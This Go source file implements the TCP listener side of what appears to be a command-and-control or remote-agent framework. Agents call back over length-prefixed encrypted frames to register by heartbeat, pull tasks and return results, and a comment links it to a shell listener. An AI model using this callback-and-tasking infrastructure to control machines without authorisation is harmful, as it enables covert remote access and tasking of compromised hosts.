package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
)

// ============ TCP Agent 回连监听器 ============
// 独立端口（agent_tcp_port，默认 28443），与 HTTP/WS 共用通信协议（加密 payload）
// 帧格式: [4字节大端长度][base64密文]，长度字段是后续 base64 密文的字节数
// 通信流程: 客户端连接后发 heartbeat → 服务端返回 → 客户端轮询 pull → 回传 result
// 长连接，不关闭，与 WebSocket 模式逻辑一致，只是传输层不同

// startAgentTCPListener 启动 TCP Agent 监听器（类似 startShellListener）
func startAgentTCPListener(port string) {
	if port == "" {
		port = "28443"
	}
	addr := "0.0.0.0:" + port
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Printf("[WARN] Agent TCP 监听 %s 失败: %v\n", addr, err)
		return
	}
	fmt.Printf("[OK] Agent TCP 监听于 %s（TCP 协议 Agent 回连）\n", addr)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go handleAgentTCPConn(conn)
		}
	}()
}

// handleAgentTCPConn 处理单个 TCP Agent 连接
func handleAgentTCPConn(conn net.Conn) {
	defer conn.Close()
	remoteAddr := conn.RemoteAddr().String()
	log.Printf("[TCP Agent] Connection from %s", remoteAddr)

	var registeredClientID string
	var agentConn *AgentConn

	defer func() {
		if registeredClientID != "" {
			unregisterAgentConn(registeredClientID)
			log.Printf("[TCP Agent] Unregistered %s (client_id=%s)", remoteAddr, registeredClientID)
		}
	}()

	for {
		// 读 4 字节长度（大端 uint32）
		var lenBuf [4]byte
		if _, err := io.ReadFull(conn, lenBuf[:]); err != nil {
			return
		}
		msgLen := binary.BigEndian.Uint32(lenBuf[:])
		if msgLen == 0 || msgLen > 10*1024*1024 {
			return
		}
		// 读消息体（base64 密文）
		msgBuf := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, msgBuf); err != nil {
			return
		}

		// 构造假 Request 调用现有解密逻辑
		fakeReq := &http.Request{
			Method:     http.MethodPost,
			RemoteAddr: remoteAddr,
			Header:     http.Header{},
			Body:       io.NopCloser(strings.NewReader(string(msgBuf))),
		}
		data, err := decryptRequestData(fakeReq)
		if err != nil {
			log.Printf("[TCP Agent] Decrypt failed from %s: %v", remoteAddr, err)
			writeTCPFrame(conn, []byte(""))
			continue
		}
		op, _ := data["_op"].(string)
		delete(data, "_op")
		log.Printf("[TCP Agent] op=%s from %s", op, remoteAddr)

		// heartbeat 时提取 client_id 并注册连接
		if op == "heartbeat" {
			clientID := getString(data, "client_id", "")
			if clientID != "" {
				detectedAlgo := getDetectedAlgo(fakeReq)
				agentConn = registerAgentConn(clientID, "tcp", detectedAlgo, getEncPassword(), nil, conn)
				registeredClientID = clientID
				log.Printf("[TCP Agent] Registered client_id=%s (algo=%s)", clientID, detectedAlgo)
			}
		}

		// 用 responseRecorder 捕获加密响应，写回 TCP 帧
		rec := &responseRecorder{}
		switch op {
		case "heartbeat":
			handleAgentHeartbeatDecrypted(rec, fakeReq, data)
		case "pull":
			handleAgentPullDecrypted(rec, fakeReq, data)
		case "result":
			handleAgentResultDecrypted(rec, fakeReq, data)
		default:
			writeEncryptedError(rec, fakeReq, 404)
		}
		log.Printf("[TCP Agent] op=%s done, response %d bytes to %s", op, len(rec.body), remoteAddr)

		// 写回时加锁，避免与 pushTaskToAgent 推送交叉
		if agentConn != nil {
			agentConn.WriteMu.Lock()
			writeTCPFrame(conn, rec.body)
			agentConn.WriteMu.Unlock()
		} else {
			writeTCPFrame(conn, rec.body)
		}
	}
}

// writeTCPFrame 写入 [4字节大端长度][数据] 帧
func writeTCPFrame(conn net.Conn, data []byte) error {
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(data)))
	if _, err := conn.Write(lenBuf[:]); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}
